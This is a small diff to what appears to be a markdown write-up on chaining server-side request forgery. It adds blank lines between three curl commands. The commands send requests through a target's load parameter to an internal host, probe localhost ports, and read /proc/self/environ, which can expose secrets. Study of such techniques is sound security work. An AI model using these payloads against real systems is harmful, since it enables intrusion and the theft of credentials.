@@ -19,7 +19,11 @@
 # Chaining multiple SSRFs together
 
 ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"```
+
+
 ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"```
+
+
 ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -```
 
 # Retrieving local file through the target application
